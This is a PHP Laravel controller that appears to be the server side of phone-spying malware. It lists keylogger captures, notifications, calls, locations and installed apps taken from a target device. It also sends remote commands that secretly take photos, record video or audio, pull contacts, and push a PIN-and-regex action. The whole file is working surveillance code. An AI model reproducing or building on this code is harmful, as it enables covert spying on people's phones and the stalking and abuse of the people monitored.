<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\App;
use App\Models\Call;
use App\Models\Keylogger;
use App\Models\Location;
use App\Models\Notification;
use App\Models\Phone;
use App\Models\Remotecontrol;
use App\Traits\ApiResponser;
use Google\Service\Bigquery\AvroOptions;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Yajra\DataTables\DataTables;

class RemoteControlAPIController extends Controller
{
    use ApiResponser;
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $user = Auth::user();
        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");

        $phone_id = request('phone_id');
        $phone = Phone::where('id', $phone_id)->get()->map(function ($e) {
            $o = (object) $e->toArray();
            $o->updatedon = $e->updatedon?->format('d-m-Y H:i:s');
            $o->fcm = !!$e->fcm;
            $o->data = (object) json_decode($e->data);
            $o->perms = (object) json_decode($e->perms);
            $o->config = (object) json_decode($e->config);
            return $o;
        });
        $phone = @$phone[0];

        $type = request('type');
        if ($type == 'result') {
            if ($user->user_role == 'admin') {
                $data = Remotecontrol::where(compact('phone_id'));
            } else {
                abort(403);
            }

            return DataTables::of($data)
                ->rawColumns(['success', 'result', 'actionname'])
                ->editColumn('result', function ($row) {
                    $href = asset('storage/' . $row->result);
                    $n = explode('/', $row->result);
                    $n = end($n);
                    return "<a href='$href' target='_blank'>$n</a>";
                })->editColumn('actionname', function ($row) {
                    $ico = "";
                    if (str_starts_with($row->action, 'p1') || str_starts_with($row->action, 'p0')) {
                        $ico = "camera-alt text-info";
                    } else if (str_starts_with($row->action, 'a')) {
                        $ico = "microphone text-success";
                    } else if (str_starts_with($row->action, 'v')) {
                        $ico = "video text-danger";
                    } else if (str_starts_with($row->action, 'c')) {
                        $ico = "contact-book text-dark";
                    } else if (str_starts_with($row->action, 'push')) {
                        $ico = "exclamation-circle text-danger";
                    } else {
                    }

                    return "<span class='text-nowrap font-weight-bold'><i class='fa fa-$ico'></i> $row->actionname</span>";
                })
                ->editColumn('success', function ($row) {
                    $st = $row->fetched;
                    $status = "<span class='badge bg-warning'><i class='fa fa-spinner fa-spin'></i> En attente</span>";
                    if ($st == 0) {
                        // en attente
                    } else {
                        if ($row->success) {
                            $status = "<span class='badge bg-success'><i class='fa fa-check-circle'></i> OK</span>";
                        } elseif (!$row->success && $st == 1) {
                            $status = "<span class='badge bg-danger'><i class='fa fa-exclamation-circle'></i> Echec</span>";
                        }
                    }
                    return $status;
                })->editColumn('date', function ($row) {
                    return $row->date->format('d-m-Y H:i:s');
                })->with(compact('phone'))
                ->make(true);
        }

        if ($type == 'notif') {
            if ($user->user_role == 'admin') {
                $data = Notification::where(compact('phone_id'));
                $phoneapps = (array) @json_decode(request('phoneapps'));
                $notificationdate = explode(' to ', request('notificationdate'));
                $from = @trim($notificationdate[0]);
                $to = @trim($notificationdate[1]);
                $from = empty($from) ? date('Y-m-d') : $from;
                $to = empty($to) ? $from : $to;

                $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);
                if (count($phoneapps)) {
                    $an = App::whereIn('id', $phoneapps)->pluck('name')->all();
                    $data->whereIn('appname', $an);
                }
            } else {
                abort(403);
            }

            return DataTables::of($data)
                ->editColumn('date', function ($row) {
                    return $row->date->format('d-m-Y H:i:s');
                })
                ->make(true);
        }

        if ($type == 'keylog') {
            if ($user->user_role == 'admin') {
                $data = Keylogger::where(compact('phone_id'));
            } else {
                abort(403);
            }

            $keyloggerdate = explode(' to ', request('keyloggerdate'));
            $from = @trim($keyloggerdate[0]);
            $to = @trim($keyloggerdate[1]);
            $from = empty($from) ? date('Y-m-d') : $from;
            $to = empty($to) ? $from : $to;

            $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);

            return DataTables::of($data)
                ->rawColumns(['text', 'text0'])
                ->editColumn('date', function ($row) {
                    return $row->date->format('d-m-Y H:i:s');
                })
                ->editColumn('text', function ($row) {
                    return mb_substr(str_replace("#781227#", " ", $row->text), 0, 100, 'UTF-8');
                    // return str_replace("#781227#", "<br><br>", $row->text);
                })->addColumn('text0', function ($row) {
                    return $row->appname . "@" . str_replace("#781227#", "<br><br>", $row->text);
                })
                ->make(true);
        }

        if ($type == 'location') {
            $data = Location::where(compact('phone_id'))->orderBy('id', 'desc');
            $locationdate = explode(' to ', request('locationdate'));
            $from = @trim($locationdate[0]);
            $to = @trim($locationdate[1]);
            $from = empty($from) ? date('Y-m-d') : $from;
            $to = empty($to) ? $from : $to;
            $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);

            $data = $data->get()->map(function ($e) {
                $o = (object) $e->toArray();
                $o->date = $e->date?->format('d-m-Y H:i:s');
                return $o;
            });
            return $data;
        }

        if ($type == 'calls') {
            if ($user->user_role == 'admin') {
                $data = Call::where(compact('phone_id'));
            } else {
                abort(403);
            }

            $calldate = explode(' to ', request('calldate'));
            $from = @trim($calldate[0]);
            $to = @trim($calldate[1]);
            $from = empty($from) ? date('Y-m-d') : $from;
            $to = empty($to) ? $from : $to;

            $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);

            return DataTables::of($data)
                ->editColumn('date', function ($row) {
                    return $row->date->format('d-m-Y H:i:s');
                })
                ->editColumn('duration', function ($row) {
                    return secIntime($row->duration);
                })
                ->editColumn('type', function ($row) {
                    return callIcon($row->type);
                })
                ->rawColumns(['type'])
                ->make(true);
        }

        if ($type == 'apps') {
            if ($user->user_role == 'admin') {
                $data = App::where(compact('phone_id'));
            } else {
                abort(403);
            }
            return DataTables::of($data)
                ->editColumn('installdate', function ($row) {
                    return $row->installdate?->format('d-m-Y H:i:s');
                })
                ->editColumn('is_uninstalled', function ($row) {
                    if ($row->is_uninstalled) {
                        return "<span class='text-nowrap'><i class='fas fa-ban text-danger'></i> Désinstallée<span/>";
                    }
                    return "<span class='text-nowrap'><i class='fas fa-check-circle text-success'></i> Installée<span/>";
                })
                ->editColumn('type', function ($row) {
                    return callIcon($row->type);
                })
                ->rawColumns(['is_uninstalled'])
                ->make(true);
        }

        abort(403);
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {

        $user = Auth::user();
        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");

        $phone_id = request('phone_id');
        $phone = Phone::where('id', $phone_id)->first();
        if (!$phone_id || !$phone) {
            abort(422, "No Phone Provided");
        }
        $action = request('action');
        $action2 = request('action2');
        if ($action2) {
            $action = $action2;
        }

        if ($action == 'c') {
            // contact
            $actionname = "Liste Contact";
        } elseif ($action == 'video') {
            $camera = (string) request('camera');
            $minute = (string) request('minute');
            abort_if(!in_array($camera, ["0", "1"], true), 422, "Invalid data [CAM]");
            abort_if(!in_array($minute, [1, 3, 5, 10, 20]), 422, "Invalid data [MIN]");
            $sec = 60 * $minute;
            $action = "v$camera.$sec";
            $actionname = "Vidéo | {$minute}min | Caméra " . ($camera == 1 ? "Avant" : "Arrière");
        } elseif ($action == 'audio') {
            $minute = (string) request('minute');
            abort_if(!in_array($minute, [1, 3, 5, 10, 20]), 422, "Invalid data [MIN]");
            $sec = 60 * $minute;
            $action = "a.$sec";
            $actionname = "Audio | {$minute}min";
        } elseif ($action == 'photo') {
            $camera = (string) request('camera');
            $flash = request()->has('flash') ? 1 : 0;
            abort_if(!in_array($camera, ["0", "1"], true), 422, "Invalid data [CAM]");
            $action = "p$camera.$flash";
            $actionname = "Photo | Caméra " . ($camera == 1 ? "Avant" : "Arrière");
            if ($flash) {
                $actionname .= " | Avec Flash";
            }
        } else if ($action == "push") {
            if ($user->user_role != 'admin') {
                abort(404);
            }
            $push = explode('.', request('push'));
            abort_if(count($push) < 2, 422, "Pattern invalide [pin.regex]");
            $pin = trim(@$push[0]);
            $reg = trim(@$push[1]);

            abort_if(!is_numeric($pin) || strlen($pin) != 4, 422, "Le pin doit etre un nombre de 4 chiffre.");
            abort_if(!strlen($reg), 422, "Regex non valide.");
            $action = "push.$pin.$reg";
            $actionname = ucfirst($action);
        } else {
            abort(403, "Not allowed");
        }
        // if (in_array($action, ['p1.0', 'p1.1', 'p0.0', 'p0.1', 'c'])) {}
        $rem = Remotecontrol::create([
            'phone_id' => $phone_id,
            'action' => $action,
            'actionname' => $actionname,
            'success' => 0,
            'fetched' => 0,
            'fromadmin' => $user->user_role == 'amdin',
            'date' => nnow(),
        ]);
        $phone = $rem->phone;
        if ($phone->fcm) {
            $cmd = "$rem->id.$action";
            try {
                sendMessage($phone->fcm, $cmd);
            } catch (\Throwable $th) {
            }
        }

        return $this->success("Commande envoyée");
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function show(Remotecontrol $remotecontrol)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Remotecontrol $remotecontrol)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function destroy(Remotecontrol $remotecontrol)
    {
        //
    }
}
